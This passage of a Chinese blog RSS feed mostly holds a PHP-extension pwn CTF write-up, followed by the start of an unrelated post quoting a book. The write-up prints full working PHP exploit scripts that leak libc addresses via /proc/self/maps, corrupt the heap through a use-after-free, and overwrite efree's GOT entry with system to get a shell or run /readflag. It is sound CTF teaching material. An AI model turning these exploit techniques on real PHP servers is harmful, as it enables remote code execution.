loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/pwnshell_2.png&#39; alt=&#34;/img/phppwn/pwnshell_2.png&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;接着让&lt;code&gt;0x7daecbe57100&lt;/code&gt;指向&lt;code&gt;_efree_got&lt;/code&gt;，申请几次0x18大小的堆，改&lt;code&gt;efree_got&lt;/code&gt;为system&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;打的本地，远程改改system偏移，执行/readflag就行&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xD;&#xA;function str2Hex($str) {&#xD;&#xA;    $hex = &amp;#34;&amp;#34;;&#xD;&#xA;    for ($i = strlen($str) - 1;$i &amp;gt;= 0;$i--) $hex.= dechex(ord($str[$i]));&#xD;&#xA;    $hex = strtoupper($hex);&#xD;&#xA;    return $hex;&#xD;&#xA;}&#xD;&#xA;function int2Str($i, $x = 8) {&#xD;&#xA;    $re = &amp;#34;&amp;#34;;&#xD;&#xA;    for ($j = 0; $j &amp;lt; $x; $j&amp;#43;&amp;#43;) {&#xD;&#xA;        $re .= pack(&amp;#39;C&amp;#39;, $i &amp;amp; 0xff);&#xD;&#xA;        $i &amp;gt;&amp;gt;= 8;&#xD;&#xA;    }&#xD;&#xA;    return $re;&#xD;&#xA;}&#xD;&#xA;function p64($value) {&#xD;&#xA;    return pack(&amp;#34;Q&amp;#34;, $value); // 64-bit little-endian&#xD;&#xA;}&#xD;&#xA;function p32($value) {&#xD;&#xA;    return pack(&amp;#34;V&amp;#34;, $value); // 32-bit little-endian&#xD;&#xA;}&#xD;&#xA;function u64($data) {&#xD;&#xA;    return unpack(&amp;#34;Q&amp;#34;, $data)[1]; // 64-bit little-endian&#xD;&#xA;}&#xD;&#xA;function u32($data) {&#xD;&#xA;    return unpack(&amp;#34;V&amp;#34;, $data)[1]; // 32-bit little-endian&#xD;&#xA;}&#xD;&#xA;function leakaddr($buffer){&#xD;&#xA;&#xD;&#xA;    global $libc, $mbase, $anon_maps;&#xD;&#xA;    $p = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&amp;#39;;&#xD;&#xA;    // $p1 = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&amp;#39;;&#xD;&#xA;    $p1 = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .*  \/usr\/lib\/php\/20230831\/vuln.so/&amp;#39;;&#xD;&#xA;    preg_match_all($p, $buffer, $libc);&#xD;&#xA;    preg_match_all($p1, $buffer, $mbase);&#xD;&#xA;    &#xD;&#xA;    return &amp;#34;&amp;#34;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;$libc=&amp;#34;&amp;#34;;&#xD;&#xA;$mbase=&amp;#34;&amp;#34;;&#xD;&#xA;&#xD;&#xA;ob_start(&amp;#34;leakaddr&amp;#34;);&#xD;&#xA;include(&amp;#34;/proc/self/maps&amp;#34;);&#xD;&#xA;$buffer = ob_get_contents();&#xD;&#xA;ob_end_flush();&#xD;&#xA;leakaddr($buffer);&#xD;&#xA;$libc_base = hexdec($libc[1][0]);&#xD;&#xA;$mod_base = hexdec($mbase[1][0]);&#xD;&#xA;&#xD;&#xA;echo &amp;#34;libc base: 0x&amp;#34;.dechex($libc_base).&amp;#34;\n&amp;#34;;&#xD;&#xA;echo &amp;#34;mod base: 0x&amp;#34;.dechex($mod_base).&amp;#34;\n&amp;#34;;&#xD;&#xA;&#xD;&#xA;function add($a, $b){&#xD;&#xA;    addHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;function rm($a){&#xD;&#xA;    removeHacker($a);&#xD;&#xA;}&#xD;&#xA;function edit($a, $b){&#xD;&#xA;    editHacker($a, $b);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;$system = $libc_base &amp;#43; 0x58750;&#xD;&#xA;$efree_got = $mod_base &amp;#43; 0x4038;&#xD;&#xA;&#xD;&#xA;#先emalloc 0x10&amp;#43;后面，再emalloc 前面&#xD;&#xA;# heap2 heap1&#xD;&#xA;add(&amp;#34;/bin/sh&amp;#34;, str_repeat(&amp;#34;a&amp;#34;,7));    //0&#xD;&#xA;add(str_repeat(&amp;#34;b&amp;#34;,0x8), str_repeat(&amp;#34;b&amp;#34;,7));    //1&#xD;&#xA;add(str_repeat(&amp;#34;c&amp;#34;,0x8), str_repeat(&amp;#34;c&amp;#34;,7));    //2&#xD;&#xA;add(str_repeat(&amp;#34;d&amp;#34;,0x8), str_repeat(&amp;#34;d&amp;#34;,8));    //3&#xD;&#xA;&#xD;&#xA;//改_efree_got为system&#xD;&#xA;add(str_repeat(&amp;#34;a&amp;#34;,0x10).p64($efree_got),str_repeat(&amp;#34;a&amp;#34;,0x50));&#xD;&#xA;add(str_repeat(&amp;#34;a&amp;#34;,0x18),str_repeat(&amp;#34;a&amp;#34;,0x50));&#xD;&#xA;add(p64($system).p64(0).p64(0),str_repeat(&amp;#34;b&amp;#34;,0x50));&#xD;&#xA;&#xD;&#xA;edit(0,&amp;#34;aaaaaaaaaaaaaaaaaaaa&amp;#34;); //触发&#xD;&#xA;// tele &amp;amp;chunkList&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;堆uafhackphp&#34;&gt;&lt;span&gt;堆UAF：hackphp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%a0%86uafhackphp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;题目来源：D3CTF 2021 hakphp&lt;/p&gt;&#xA;&lt;p&gt;参考：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/235237#h2-5&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.anquanke.com/post/id/235237#h2-5&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;思路&#34;&gt;&lt;span&gt;思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;void __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value)&#xD;&#xA;{&#xD;&#xA;  zval *arg_num; // rdi&#xD;&#xA;  __int64 size[3]; // [rsp&amp;#43;0h] [rbp-18h] BYREF&#xD;&#xA;&#xD;&#xA;  arg_num = (zval *)execute_data-&amp;gt;This.u2.var_flags;&#xD;&#xA;  size[1] = __readfsqword(0x28u);&#xD;&#xA;  if ( (unsigned int)zend_parse_parameters(arg_num, &amp;amp;unk_2000, size) != -1 )&#xD;&#xA;  {&#xD;&#xA;    buf = (char *)_emalloc(size[0]);&#xD;&#xA;    buf_size = size[0];&#xD;&#xA;    if ( buf )&#xD;&#xA;    {&#xD;&#xA;      if ( (unsigned __int64)(size[0] - 0x100) &amp;lt;= 0x100 )&#xD;&#xA;      {&#xD;&#xA;        return_value-&amp;gt;u1.type_info = 3;&#xD;&#xA;        return;&#xD;&#xA;      }&#xD;&#xA;      _efree();&#xD;&#xA;    }&#xD;&#xA;  }&#xD;&#xA;  return_value-&amp;gt;u1.type_info = 2;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里申请一个大于&lt;code&gt;0x200&lt;/code&gt;的堆块后，存在UAF，就可以修改&lt;code&gt;slot&lt;/code&gt;链表&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;str_repeat&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;str_repeat&lt;/code&gt;会调用&lt;code&gt;emalloc&lt;/code&gt;申请堆块，大小为（字符数+0x18）向上对齐一个&lt;code&gt;slot&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;需要把&lt;code&gt;str_repeat&lt;/code&gt;赋值给一个变量，不然这个堆块会被收回&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$heap1 = str_repeat(&amp;quot;A&amp;quot;,0x1f0);&lt;/code&gt;后，返回的是&lt;code&gt;0x210&lt;/code&gt;大小的堆块，内存布局：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; dq 0x7e0878471000&#xD;&#xA;0x7e0878471000: 0x0000000600000001      0x0000000000000000&#xD;&#xA;0x7e0878471010: 0x00000000000001f0      0x4141414141414141&#xD;&#xA;0x7e0878471020: 0x4141414141414141      0x4141414141414141&#xD;&#xA;0x7e0878471030: 0x4141414141414141      0x4141414141414141&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里选择修改&lt;code&gt;efree_got&lt;/code&gt;为&lt;code&gt;system&lt;/code&gt;，然后&lt;code&gt;free&lt;/code&gt;掉一个存储字符串&lt;code&gt;/readflag&lt;/code&gt;的堆块&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;exp-1&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xD;&#xA; &#xD;&#xA;$heap_base = 0;&#xD;&#xA;$libc_base = 0;&#xD;&#xA;$libc = &amp;#34;&amp;#34;;&#xD;&#xA;$mbase = &amp;#34;&amp;#34;;&#xD;&#xA;&#xD;&#xA;function p64($value) {&#xD;&#xA;    return pack(&amp;#34;Q&amp;#34;, $value);&#xD;&#xA;}&#xD;&#xA;function p32($value) {&#xD;&#xA;    return pack(&amp;#34;V&amp;#34;, $value);&#xD;&#xA;}&#xD;&#xA;function u64($data) {&#xD;&#xA;    return unpack(&amp;#34;Q&amp;#34;, $data)[1];&#xD;&#xA;}&#xD;&#xA;function u32($data) {&#xD;&#xA;    return unpack(&amp;#34;V&amp;#34;, $data)[1];&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;function leakaddr($buffer){&#xD;&#xA;    global $libc, $mbase;&#xD;&#xA;    $p = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .* \/usr\/lib\/x86_64-linux-gnu\/libc-2.31.so/&amp;#39;;&#xD;&#xA;    $p1 = &amp;#39;/([0-9a-f]&amp;#43;)\-[0-9a-f]&amp;#43; .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20190902\/hackphp.so/&amp;#39;;&#xD;&#xA;    preg_match_all($p, $buffer, $libc);&#xD;&#xA;    preg_match_all($p1, $buffer, $mbase);&#xD;&#xA;    return &amp;#34;&amp;#34;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;ob_start(&amp;#34;leakaddr&amp;#34;);&#xD;&#xA;include(&amp;#34;/proc/self/maps&amp;#34;);&#xD;&#xA;$buffer = ob_get_contents();&#xD;&#xA;ob_end_flush();&#xD;&#xA;leakaddr($buffer);&#xD;&#xA;&#xD;&#xA;$libc_base = hexdec($libc[1][0]);&#xD;&#xA;$modBase = hexdec($mbase[1][0]);&#xD;&#xA;&#xD;&#xA;$system = $libc_base &amp;#43; 0x52290;&#xD;&#xA;$efree_got = $modBase &amp;#43; 0x4070;&#xD;&#xA;&#xD;&#xA;echo &amp;#34;libc_base:0x&amp;#34; . dechex($libc_base) . &amp;#34;\n&amp;#34;;&#xD;&#xA;echo &amp;#34;modBase:0x&amp;#34; . dechex($modBase) . &amp;#34;\n&amp;#34;;&#xD;&#xA;&#xD;&#xA;hackphp_create(0x210);&#xD;&#xA;hackphp_edit(p64($modBase&amp;#43;0x4178-0x28));&#xD;&#xA;$heap1 = str_repeat(&amp;#34;A&amp;#34;,0x1f0);&#xD;&#xA;$heap1 = str_repeat(p64($modBase&amp;#43;0x4070),(0x1f0)/8);&#xD;&#xA;&#xD;&#xA;hackphp_edit(p64($system));&#xD;&#xA;hackphp_create(0x100);&#xD;&#xA;hackphp_edit(&amp;#34;/readflag&amp;#34;);&#xD;&#xA;hackphp_delete();&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;uafphpmaster&#34;&gt;&lt;span&gt;UAF：phpmaster&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#uafphpmaster&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;题目来源：第二届长城杯半决赛 phpmaster&lt;/p&gt;&#xA;&lt;p&gt;参考：https://bbs.kanxue.com/thread-286086.htm&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;长城杯2025-php-pwn-simi-final-php-master&#34;&gt;&lt;span&gt;长城杯2025 (php-pwn) simi-final php-master&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%95%bf%e5%9f%8e%e6%9d%af2025-php-pwn-simi-final-php-master&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;参考文章以及附件https://bbs.kanxue.com/thread-286567.htm&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;n1ctf-2024php-master&#34;&gt;&lt;span&gt;N1CTF 2024—php master&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#n1ctf-2024php-master&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.ctfiot.com/213627.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.ctfiot.com/213627.html&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/m4p1e/php-exploit/tree/master/n1ctf24-php-master&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;php-exploit/n1ctf24-php-master at master · m4p1e/php-exploit&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://xia0.sh/blog/save-me-web-master-pwn-n1ctf-2024-php-master/save-me-web-master-pwn-n1ctf-2024-php-master&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xia0.sh/blog/save-me-web-master-pwn-n1ctf-2024-php-master/save-me-web-master-pwn-n1ctf-2024-php-master&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;r3ctf2025_not_a_web_chal&#34;&gt;&lt;span&gt;R3CTF2025_not_a_web_chal&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#r3ctf2025_not_a_web_chal&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;强网杯-2025-go2php&#34;&gt;&lt;span&gt;强网杯 2025 go2php&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%bc%ba%e7%bd%91%e6%9d%af-2025-go2php&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;</description>
    </item>
    <item>
      <title>《明朝那些事儿》</title>
      <link>http://localhost:1313/posts/read_mcnxse/</link>
      <pubDate>Mon, 26 Jan 2026 15:32:42 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_mcnxse/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;p&gt;一本真正教人树立品性和信念的读物&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;长期的困难生活，最能磨炼一个人的意志。有很多人在遇到困难后，只能怨天尤人，得过且过，而另外一些人虽然也不得不在困难面前低头，但他们的心从未屈服，他们不断地努力，相信一定能够取得最后的胜利。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;即使你拥有人人羡慕的容貌、博览群书的才学、挥霍不尽的财富，也不能证明你的强大。因为心的强大，才是真正的强大。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div 